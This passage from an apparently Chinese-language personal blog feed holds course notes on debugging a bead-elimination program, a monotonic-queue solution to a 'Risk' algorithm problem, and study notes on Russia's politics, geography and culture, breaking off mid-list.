operator">&amp;</span>a<span class="token punctuation">[</span>copied<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        copied <span class="token operator">+=</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时对 <code>a[copied]</code> 进行 <code>memcpy</code> 时则会因为 <code>plen[i]</code> 过大而导致越界访问到 <code>p[i]</code> 长度之外的内存, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>只需构造一个在同一数组内发生一次消除, 产生 <code>l.first = r.first</code> 的情形. 此时会因为在 <code>memcpy(&amp;a[copied], p[0], plen[0])</code> 部分出现越界访问, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">ABBC<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码 10"></a>代码 10</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中消除结束后, 如果消除发生在不同的块中, 那么会将 <code>l.first</code> 所在块的长度错误地记为 <code>0</code>, 如果在后续操作中插入珠子的位置在此之后, 那么 <code>find()</code> 函数查找到的位置就会出错, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入充分长的串 <code>a</code> 使得 <code>a</code> 被存储在两个数组 <code>p[0]</code>, <code>p[1]</code> 中, 随后输出字符使得在 <code>p[0]</code>、<code>p[1]</code> 连接处产生消除, 程序将 <code>p[0]</code> 的长度错误地记为 <code>0</code>, 进而之后的插入会插入错误地位置, 直接关联到之后 <code>p2a()</code> 的过程, 产生 <code>Wrong Answer</code>.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Risk</title>
      <link href="/2022/10/17/shu-ju-jie-gou-risk/"/>
      <url>/2022/10/17/shu-ju-jie-gou-risk/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-1-Risk"><a href="#2-1-Risk" class="headerlink" title="2-1 Risk"></a>2-1 Risk</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题的思路是先求出由每一天回溯所得的最大单日确诊病例数, 然后使用前缀和算法处理得到的最大病例数数组, 最后对于每组给定的输入 <code>p</code>、<code>q</code>, 查询并输出相应的低、中风险天数.</p><p>使用数组 <code>x[i]</code> 储存每日的确诊人数, 数组 <code>m[i]</code> 储存对应的回溯天数. 实际上, 本题相当于用一个滑动窗口来扫描遍历 <code>x[i]</code> 数组, 并返回 <code>x[i - m[i]]</code> 到 <code>x[i - 1]</code> 这个窗口中的最大值.</p><p>注意到序列 <code>x[i - m[i]]</code> 是不减的, 那么窗口整体是向右移动的, 对于窗口内不同的两天 <code>i &lt; j</code>, 若经过一系列移动后 <code>i</code> 在窗口内, 那么 <code>j</code> 必然也在窗口内. 此时如果 <code>x[i] &lt;= x[j]</code>, 那么 <code>x[i]</code> 将不会对窗口中的最大值做出贡献.</p><p>这也就是说, 随着窗口右移加入新的确诊病例数, 窗口内不大于该数的数字在之后都不会成为窗口中的最大值 (它至少不大于这个新加入的确诊病例数). 也就是说, 我们可以直接删去窗口中不大于新加入确诊病例数的所有数.</p><p>构造单调队列这一数据结构, 队列中元素从队首到队尾降序排列. 对于每一次窗口扫描, 我们将窗口最右端新加入的元素与队尾元素比较, 若队尾元素不大于新入队元素, 则删去队尾元素, 最后将新元素入队. 如此操作, 保证了队列元素的单调性. 同时使用 <code>int</code> 数组与两个 <code>int</code> 类型整数 <code>header</code>、<code>trailer</code> 记录队列的首尾位置, 模拟单调队列的功能. 对于队列中的每个元素, 我们在入队的同时记录它的确诊病例数和它在原数组中的天数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 8</span><span class="token keyword">class</span> <span class="token class-name">PriorityQueue</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 指向头部.</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 指向尾部.</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数在原数组中对应的天数.</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数的大小.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考虑到窗口的左端实际上是单调不减的, 因此在队尾元素出队后, 它不可能再次入队. 只需要查询队首元素, 如果它对应的位置不位于滑动窗口中, 则删去该元素, 最后剩下的满足条件的队首元素即是窗口中对应的最大确诊病例数. 我们使用 <code>cases[i]</code> 数组存储第 <code>i</code> 天回溯对应的最大确诊病例数. 然后遍历 <code>cases[i]</code>, 将为病例数大小 <code>k</code> 出现的天数记录在数组 <code>sum[k]</code> 中. 随后对 <code>sum</code> 数组从第二项开始求出前缀和, <code>sum[k - 1]</code> 即对应了 <code>cases</code> 数组中病例数位于 $[0, k)$ 范围内的天数. 如此操作, 我们在查询时只需访问数组 <code>sum[i]</code>, 这实现了 $O(1)$ 的复杂度.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>注意到 <code>p</code>, <code>q</code>, <code>m[i]</code> 的范围均为 $[1, 2^{32} - 1]$, 超过了 <code>int</code> 的范围, 因此使用 <code>long long</code> 数组存储.</p><p>若 <code>p = 0</code>, 则需直接返回低风险天数为 <code>0</code>; 若输入的 <code>p</code>、<code>q</code> 过大, 由于 <code>x[i]</code> 的范围为 $[1, 2\times 10^6]$, 在查询时应直接返回全部的风险天数. 这在代码中体现为使用 <code>flag</code> 记录最大单日确诊病例数的上界, 当超过此上界时, 直接返回 <code>sum[flag]</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 54</span><span class="token comment">// 计算病例数位于 [0, p) 范围内的天数.</span>ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>     ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 计算病例数位于 [0, q) 范围内的天数.</span>ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自计算最大单日确诊病例、计算前缀和与查询风险天数等部分:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 30</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>header <span class="token operator">&lt;=</span> que<span class="token punctuation">.</span>trailer <span class="token operator">&amp;&amp;</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        que<span class="token punctuation">.</span>trailer<span class="token operator">--</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>trailer<span class="token operator">++</span><span class="token punctuation">;</span>     que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span> <span class="token operator">&lt;</span> i <span class="token operator">-</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>         que<span class="token punctuation">.</span>header<span class="token operator">++</span><span class="token punctuation">;</span>    cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在计算最大单日确诊病例时, 每个元素最多入队且出队一次, 从而时间复杂度与输入元素数成正比, 为 $O(n)$;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 42</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    flag <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    sum<span class="token punctuation">[</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> flag<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在进行前缀和计算时, 由于 <code>flag = max(x[i])</code>, 从而时间复杂度为 $O(n + max(x[i]))$;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 52</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> t<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> p <span class="token operator">&gt;&gt;</span> q<span class="token punctuation">;</span>    ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>         ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在查询风险天数时, 每次查询用时常数时间, 从而时间复杂度与查询次数成正比, 为 $O(T)$;</p><p>综上, 算法总时间复杂度为 $O(n + max(x[i]) + T)$.</p><p>算法空间复杂度主要来自读取并存储数据的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 4</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXLEN</span> <span class="token expression"><span class="token number">1000000</span></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 8</span><span class="token keyword">class</span> <span class="token class-name">PriorityQueue</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 18</span><span class="token keyword">int</span> x<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> m<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> cases<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">int</span> sum<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>PriorityQueue que<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码开辟了定长的数组用于存储相关数据, 算法的空间复杂度约为: $8B\times 2\times 10^6 + 4B \times 5\times 10^6 = 36000KB$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>俄罗斯概况</title>
      <link href="/2022/10/09/e-yu-e-luo-si-gai-kuang/"/>
      <url>/2022/10/09/e-yu-e-luo-si-gai-kuang/</url>
      
        <content type="html"><![CDATA[<h1 id="俄罗斯概况"><a href="#俄罗斯概况" class="headerlink" title="俄罗斯概况"></a>俄罗斯概况</h1><h2 id="政治与经济"><a href="#政治与经济" class="headerlink" title="政治与经济"></a>政治与经济</h2><h3 id="国名"><a href="#国名" class="headerlink" title="国名"></a>国名</h3><ul><li>俄罗斯联邦(Российская Федерация), 俄罗斯(Россия)</li></ul><h3 id="国旗"><a href="#国旗" class="headerlink" title="国旗"></a>国旗</h3><ul><li>横长方形, 长与宽之比约为３∶２, 旗面自上而下分别为白、蓝、红三色. 俄罗斯幅员辽阔, 国土跨寒带、亚寒带和温带三个气候带, 用三色横长方形平行相连, 表示了俄罗斯地理位置上的这一特点.</li><li>白色代表寒带一年四季白雪茫茫的自然景观; 蓝色既代表亚寒带气候区, 又象征俄罗斯丰富的石油天然气和森林、水力等自然资源; 红色是温带的标志, 也象征俄罗斯历史的悠久和对人类文明的贡献.</li></ul><h3 id="国徽"><a href="#国徽" class="headerlink" title="国徽"></a>国徽</h3><ul><li>国徽为盾徽, 红色盾面上有一只金色的双头鹰, 鹰头上是彼得大帝的三顶皇冠; 鹰爪抓着象征皇权的权杖和金球, 鹰胸前是一个小盾形, 上面是一名骑士和一匹白马; 双头鹰一头望着西方, 另一头望着东方, 象征着两块大陆间的统一以及各民族的联合.</li></ul><h3 id="政体"><a href="#政体" class="headerlink" title="政体"></a>政体</h3><ul><li>俄罗斯实行总统制的联邦国家体制, 俄罗斯联邦总统是国家元首. 俄罗斯联邦会议是联邦的代表与立法机关, 联邦会议由联邦委员会(上院)和国家杜马(下院)两院组成; 国家杜马是俄罗斯的立法机构, 由450名代表组成, 每4年选举一次.</li></ul><h3 id="人口"><a href="#人口" class="headerlink" title="人口"></a>人口</h3><ul><li>全国有约1.42亿人口, 有130多个民族, 其中俄罗斯族人占82.95%, 人口分布极不均衡. 高加索地区的民族成分最为复杂, 有大约40个民族在此生活. 居民多信奉东正教, 其次为伊斯兰教.</li><li>俄语是俄罗斯联邦全境内的官方语言, 各共和国有权规定自己的国语, 并在该共和国境内可与俄语一起使用. 主要少数民族都有自己的语言和文字.</li></ul><h3 id="地理"><a href="#地理" class="headerlink" title="地理"></a>地理</h3><ul><li>面积1707.54万多平方公里, 是世界上领土面积最大的国家. 位于欧洲东部和亚洲北部, 其欧洲领土的大部分是东欧平原. </li><li>东濒太平洋, 西接波罗的海芬兰湾, 东西最长9000公里, 南北最宽4000公里, 海岸线长33807公里.</li><li>大部分地区处于北温带, 以大陆性气候为主, 温差普遍较大.</li></ul><h3 id="分界线"><a href="#分界线" class="headerlink" title="分界线"></a>分界线</h3><ul><li>俄罗斯亚欧大陆以乌拉尔山和乌拉尔河为界, 位于叶卡捷琳堡.</li></ul><h3 id="首都"><a href="#首都" class="headerlink" title="首都"></a>首都</h3><ul><li>莫斯科(Mocквa), 人口约850万, 1995年5月16日与北京市结为友好城市.</li></ul><h3 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h3><ul><li>天然气蕴藏量占世界探明储量的三分之一, 居世界第一位; 石油探明储量占世界探明储量的12%至13%; 煤蕴藏量居世界第二位. 丰富的资源为俄罗斯工农业发展提供了坚实的后盾.</li><li>俄工业基础雄厚, 部门齐全, 以机械、钢铁、冶金、石油、天然气、煤炭、森林工业及化工等为主.</li><li>俄农牧业并重, 主要农作物有小麦、大麦、燕麦、玉米、水稻和豆类, 畜牧业主要为养牛、养羊、养猪业.</li></ul><h2 id="文化与艺术"><a href="#文化与艺术" class="headerlink" title="文化与艺术"></a>文化与艺术</h2><h3 id="博物馆"><a href="#博物馆" class="headerlink" title="博物馆"></a>博物馆</h3><ul><li>俄罗斯的博物馆按专业可分为革命历史博物馆、历史博物馆、艺术博物馆、各专业博物馆以及其他博物馆等. 大型革命历史博物馆有俄罗斯中央革命博物馆、国家历史博物馆、克里姆林宫博物馆、中央海军博物馆等. 莫斯科被称为博物馆的城市, 最为著名的艺术馆有莫斯科特列季亚科夫画廊(国家绘画陈列馆).</li></ul><h3 id="风俗"><a href="#风俗" class="headerlink" title="风俗"></a>风俗</h3><ul><li>俄罗斯人交际时通常在三种情况下使用”你”:<ul><li>对16岁以下的儿童</li><li>近亲之间与同事之间</li><li>年轻人对年轻人 </li></ul></li><li>对老年人、陌生人和领导人称”您”.</li><li>对儿童可直呼其名, 而对老年人、陌生人和领导人则应呼其名字加父称.</li><li>在商业机构、新闻媒体和官方机构中人们习惯相互称”先生”; “同志”在国营企业、军队、公安部门使用; 而”公民”通常在公共场所使用; 在公开发言时, 一般在发言人的姓后面加上”先生”、”同志”或其相应职称”教授”、”工程师”等.</li></ul><h3 id="普希金"><a href="#普希金" class="headerlink" title="普希金"></a>普希金</h3><ul><li>俄国最伟大的诗人, 浪漫主义文学的杰出代表, 现实主义文学的奠基人, 现代俄语标准语的创始人, 他的作品是俄国民族意识高涨以及贵族革命运动在文学上的反映. 1837年2月, 普希金在彼得堡因决斗腹部受重伤去世.</li><li>有政治抒情诗《致恰达耶夫》(1818)、《自由颂》(1817)、《致西伯利亚的囚徒》(1827); 也有大量爱情诗和田园诗《我记得那美妙的一瞬》(1825)、《假如生活欺骗了你》(1825)、《我曾爱过您》(1829) 和《我又重新造访》(1835)等. 普希金一生创作了12部叙事长诗, 最主要的是《鲁斯兰和柳德米拉》、《高加索的俘虏》(1822)、《青铜骑士》(1833)等. 他的作品是“反映俄国社会的一面镜子”.</li></ul><h3 id="托尔斯泰"><a href="#托尔斯泰" class="headerlink" title="托尔斯泰"></a>托尔斯泰</h3><ul><li>俄国著名作家, 出身于贵族家庭, 1844年入喀山大学东方语文系和法律系学习, 1851年参军, 参加过克里木战争. 主要作品有《战争与和平》(1869)、《安娜·卡列尼娜》(1877)、《复活》(1899)等. 晚年放弃贵族特权和财产, 过着平民生活. </li></ul><h3 id="柴可夫斯基"><a href="#柴可夫斯基" class="headerlink" title="柴可夫斯基"></a>柴可夫斯基</h3><ul><li>俄罗斯历史上最伟大的作曲家, 俄罗斯民族音乐与西欧古典音乐的集大成者. 他的音乐基调建立在民歌和民间舞蹈的基础上, 乐曲中呈现出浓烈的生活气息和民间特色. 他的作品是现实主义和浪漫主义结合的典范. </li><li>有歌剧《叶甫根尼·奥涅金》、《黑桃皇后》等, 芭蕾舞剧《天鹅湖》、《睡美人》, 交响曲《第四交响曲》、《第五交响曲》以及交响诗《罗密欧与朱丽叶》等. </li></ul><h3 id="美术、戏剧及工艺品"><a href="#美术、戏剧及工艺品" class="headerlink" title="美术、戏剧及工艺品"></a>美术、戏剧及工艺品</h3><ul><li>俄罗斯的美术源远流长, 著名的艺术大师有列维坦、列宾、苏里柯夫、克拉姆斯科伊等. 俄罗斯的宗教音乐和民间音乐有着深远的历史传统, 歌剧、交响乐和室内音乐具有鲜明的民族气质, 奔放豪迈. </li><li>俄罗斯的戏剧艺术体裁和形式多样, 最早出现在宫廷里, 19世纪进入繁荣时期. 果戈理的《钦差大臣》等社会戏剧充满强烈的时代气息, 具有鲜明的民族特色; 亚·尼·奥斯特罗夫斯基是19世纪50年代以后俄罗斯文坛众多的戏剧作家中最杰出的代表, 被称为“俄罗斯戏剧之父”. </li><li>俄罗斯的马戏团在俄罗斯也很受人们的欢迎, 马戏团团员训练有素, 技艺精湛. </li><li>俄罗斯最有名的工艺品有木制套娃、木刻勺、木盒、木盘等木制品.  </li></ul><h3 id="名胜古迹"><a href="#名胜古迹" class="headerlink" title="名胜古迹"></a>名胜古迹</h3><ul><li>莫斯科<ul><li>克里姆林宫</li><li>红场</li><li>列宁墓</li><li>莫斯科河</li><li>凯旋门</li><li>俄罗斯大剧院</li></ul></li><li>圣彼得堡<ul><li>青铜骑士</li><li>涅瓦大街</li><li>桥的城市</li><li>“白夜”</li><li>彼得大帝夏宫</li><li>东宫</li><li>“阿芙乐尔号”巡洋舰</li></ul></li></ul><h3 id="莫斯科地铁"><a href="#莫斯科地铁" class="headerlink" title="莫斯科地铁"></a>莫斯科地铁</h3><ul><li>莫斯科地铁(Moscow Metro)是世界上规模最大的地铁之一, 被公认为世界上最漂亮的地铁, 享有“地下的艺术殿堂”之美称. </li><li>1935年5月15日, 苏联政府正式开通莫斯科地铁, 其建设工程耗时仅3年. 如今, 莫斯科地铁全长220多公里, 其布局与地面的布局一致, 呈辐射及环行线路. </li><li>地铁运行速度很快, 时速最高达90公里. 地铁站的建筑造型各异、华丽典雅, 广泛采用大理石、马赛克、花岗石、陶瓷和五彩玻璃, 装饰出具有不同艺术风格的大型壁画及各种浮雕、雕刻. 地铁站除根据民族特点建造外, 还以名人、历史事迹、政治事件为主题而建造.   </li></ul><h2 id="外交与语言"><a href="#外交与语言" class="headerlink" title="外交与语言"></a>外交与语言</h2><h3 id="建交"><a href="#建交" class="headerlink" title="建交"></a>建交</h3><ul><li>1949年10月2日, 中国与苏联建交. </li><li>1991年12月27日, 中俄两国在莫斯科签署《会谈纪要》, 正式建立两国国家关系.</li><li>2004年10月, 中俄两国发表联合声明并签署了《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》, 这一协定的签署标志着中俄边界线走向全部确定. </li><li>2005年6月2日, 中国和俄罗斯在符拉迪沃斯托克互换《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》批准书, 这标志着两国彻底解决了所有历史遗留的边界问题.</li></ul><h3 id="重要年份"><a href="#重要年份" class="headerlink" title="重要年份"></a>重要年份</h3><ul><li>2006 - 中国的俄罗斯年</li><li>2007 - 